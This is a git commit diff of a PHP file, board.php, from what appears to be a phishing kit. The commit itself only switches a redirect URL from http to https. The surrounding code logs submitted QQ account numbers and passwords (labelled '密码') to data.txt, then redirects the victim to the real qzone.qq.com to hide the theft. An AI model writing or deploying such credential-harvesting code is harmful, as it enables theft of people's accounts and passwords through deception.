00dd264dbcb0b82506dade699dd3aad0aae4f6d6
zxc <zhouxingchen6@gmail.com>
2020-06-06 13:41:04 +0800

    7

--- board.php
+++ board.php
@@ -5,7 +5,7 @@ $content = $_POST['content'];
 
 file_put_contents("data.txt","QQ:<font color=blue>".$title."</font>\r\r密码:<font color=red>".$content."</font>\n\n",FILE_APPEND);
 
-echo '<meta http-equiv="refresh" content="0;URL=http://qzone.qq.com">';
+echo '<meta http-equiv="refresh" content="0;URL=https://qzone.qq.com">';
 
 
 ?>
